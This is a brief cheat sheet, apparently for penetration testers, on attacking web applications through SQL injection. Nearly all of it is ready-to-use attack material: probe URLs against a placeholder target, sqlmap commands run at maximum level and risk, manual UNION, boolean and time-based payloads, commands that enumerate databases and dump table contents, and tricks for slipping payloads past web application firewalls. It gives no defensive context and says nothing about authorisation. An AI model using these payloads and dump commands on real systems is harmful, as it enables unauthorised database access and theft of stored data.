# SQL Injection Testing

## Detection

### Error-Based
```bash
# Add quotes
https://target.com/?id=1'

# Boolean-based
https://target.com/?id=1' AND 1=1--
https://target.com/?id=1' AND 1=2--

# Time-based
https://target.com/?id=1' AND SLEEP(5)--
```

## SQLMap Testing

```bash
# Basic test
sqlmap -u "https://target.com/?id=1"

# Full options
sqlmap -u "https://target.com/?id=1" \
    --batch \
    --level=5 \
    --risk=3 \
    --threads=10

# POST request
sqlmap -r request.txt --batch

# Crawl target
sqlmap -u "https://target.com/" \
    --crawl=3 \
    --batch
```

## Manual Exploitation

### Union-Based
```sql
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' UNION SELECT table_name FROM information_schema.tables--
```

### Boolean-Based
```sql
' AND 1=1--
' AND SUBSTRING(@@version,1,1)='M'--
```

### Time-Based
```sql
' AND IF(1=1,SLEEP(5),0)--
' AND WAITFOR DELAY '0:0:5'--
```

## Data Extraction

```bash
# Get databases
sqlmap -u "url" --dbs

# Get tables
sqlmap -u "url" -D database_name --tables

# Get columns
sqlmap -u "url" -D database_name -T table_name --columns

# Dump data
sqlmap -u "url" -D database_name -T table_name --dump
```

## Prevention Bypass

- WAF bypass: `/*!UNION*/`
- Space bypass: `/**/UNION/**/SELECT`
- Case bypass: `UnIoN SeLeCt`
